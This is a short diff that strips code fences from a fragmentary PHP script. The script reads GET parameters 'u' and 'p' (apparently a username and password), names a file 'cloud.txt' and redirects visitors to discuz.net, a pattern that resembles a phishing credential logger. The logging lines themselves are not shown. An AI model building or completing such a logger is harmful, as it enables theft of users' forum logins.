@@ -1,5 +1,3 @@
-```
-
 <?php
 $file = "cloud.txt";
 if (!empty($_GET['u']) && !empty($_GET['p'])) {
@@ -14,5 +12,3 @@ if (!empty($_GET['q']) && !empty($_GET['a'])) {
 }
 Header("HTTP/1.1 301 Moved Permanently");
 Header("Location: http://www.discuz.net");
-
-```
